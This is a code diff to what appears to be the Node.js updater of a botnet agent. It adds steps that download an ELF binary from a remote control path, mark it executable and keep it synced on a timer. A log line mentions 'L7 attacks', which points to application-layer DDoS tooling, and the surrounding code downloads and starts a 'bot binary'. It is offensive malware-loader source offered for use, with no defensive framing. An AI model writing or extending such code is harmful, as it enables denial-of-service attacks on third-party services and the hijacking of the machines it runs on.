@@ -139,6 +139,15 @@ async function syncAll() {
       restartBot('binary');
     }
   }
+  const up = await fetchBuffer('abots/c/up');
+  if (up && isElf(up)) {
+    const upPath = path.join(__dirname, 'up');
+    const changed = await writeIfChanged(upPath, up);
+    await fs.promises.chmod(upPath, 0o755);
+    if (changed) {
+      console.log(`l7 binary updated (${up.length} bytes)`);
+    }
+  }
 }
 
 async function main() {
@@ -154,6 +163,15 @@ async function main() {
   await fs.promises.chmod(tmp, 0o755);
   await fs.promises.rename(tmp, botPath);
   console.log(`downloaded bot binary (${bin.length} bytes)`);
+  const up = await fetchBuffer('abots/c/up');
+  if (up && isElf(up)) {
+    const upPath = path.join(__dirname, 'up');
+    await fs.promises.writeFile(upPath, up);
+    await fs.promises.chmod(upPath, 0o755);
+    console.log(`downloaded l7 binary (${up.length} bytes)`);
+  } else {
+    console.log('warning: l7 binary not available, L7 attacks will fail');
+  }
   await syncAll();
   startBot();
   setInterval(syncAll, SYNC_MS);
